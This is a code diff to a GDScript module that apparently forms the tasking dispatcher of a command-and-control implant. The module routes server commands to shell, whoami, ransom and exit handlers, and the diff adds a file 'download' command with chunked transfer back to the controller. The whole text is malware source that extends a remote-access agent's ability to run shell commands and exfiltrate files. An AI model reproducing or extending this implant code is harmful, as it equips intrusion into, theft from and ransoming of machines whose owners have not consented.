@@ -2,17 +2,22 @@ extends Node
 
 var parent
 var api
+var task_id_to_last_action
 
 signal whoami
 signal exit
 signal ransom
 signal post_response
 signal shell
+signal download
+signal download_start
+signal download_chunk
 
 func _ready():
 	parent = $".".get_parent()
 
 	api = parent.get_node("api")
+	task_id_to_last_action = {}
 
 func _on_CallbackTimer_timeout():
 	print("_on_CallbackTimer_timeout, adding tasking request to outbound queue")
@@ -36,6 +41,9 @@ func _on_Agent_tasking(data):
 			print("task: ", task)
 
 			match task.get("command"):
+				"download":
+					task_id_to_last_action[task.get("id")] = "download"
+					emit_signal("download", task)
 				"shell":
 					emit_signal("shell", task)
 				"whoami":
@@ -48,3 +56,36 @@ func _on_Agent_tasking(data):
 					emit_signal("post_response", task)
 				_:
 					print("unknown task... ", task)
+
+func _on_Agent_post_response(data):
+	print("_on_Agent_post_response: ", data)
+	
+	var payload = data.get("payload")
+
+	for response in payload.get("responses"):
+		var task_id = response.get("task_id")
+
+		if response.get("status") == "success":
+
+			match task_id_to_last_action.get(task_id):
+				"download":
+					if response.has("file_id"):
+						emit_signal("download_start", response)
+						task_id_to_last_action[task_id ] = "download_chunk"
+					else:
+						print("Bad download response: ", response)
+				"download_chunk":
+					emit_signal("download_chunk", response)
+					task_id_to_last_action[task_id ] = "download_chunk"
+				_:
+					print("unknown download last action: ", task_id_to_last_action.get(task_id))
+		else:
+			print("failed response: ", response)
+
+	#{"action": "post_response", "responses": [{
+	#        "status": "success",
+	#        "file_id": "UUID Here"
+	#        "task_id": "task uuid here"
+	#    }
+	#]}
+	
